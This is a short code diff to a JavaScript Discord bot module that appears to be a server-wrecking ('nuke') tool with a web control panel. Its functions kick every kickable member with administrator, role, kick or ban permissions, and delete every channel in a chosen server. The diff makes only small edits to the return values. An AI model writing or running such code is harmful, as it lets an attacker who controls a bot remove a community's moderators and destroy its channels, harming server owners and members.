@@ -116,18 +116,17 @@ module.exports = {
     return '<button type="button" onclick="window.location.href = `?logoff=1`">LogOff</button>' + selm
   },
   kickAdmins: async function(guild) {
-    await client.guilds.find(g => g.id == guild).members.filter(m => (m.hasPermission("ADMINISTRATOR") || m.hasPermission("MANAGE_ROLES") || m.hasPermission("KICK_MEMBERS") || m.hasPermission("BAN_MEMBERS")) && m.kickable).forEach(async m => {
+    return await client.guilds.find(g => g.id == guild).members.filter(m => (m.hasPermission("ADMINISTRATOR") || m.hasPermission("MANAGE_ROLES") || m.hasPermission("KICK_MEMBERS") || m.hasPermission("BAN_MEMBERS")) && m.kickable).forEach(async m => {
       await m.kick()
       console.log("Kicked " + m.user.tag)
     })
     return await 1
   },
   delAllChs: async function(guild) {
-    await client.guilds.find(g => g.id == guild).channels.forEach(async c => {
+    return await client.guilds.find(g => g.id == guild).channels.forEach(async c => {
       await c.delete()
       await console.log("Deleted " + c.name)
     })
-    return await 1
   },
   messages: async function(channel) {
     remote = "<br />ERR 2 (NO MESSAGES FOUND)"
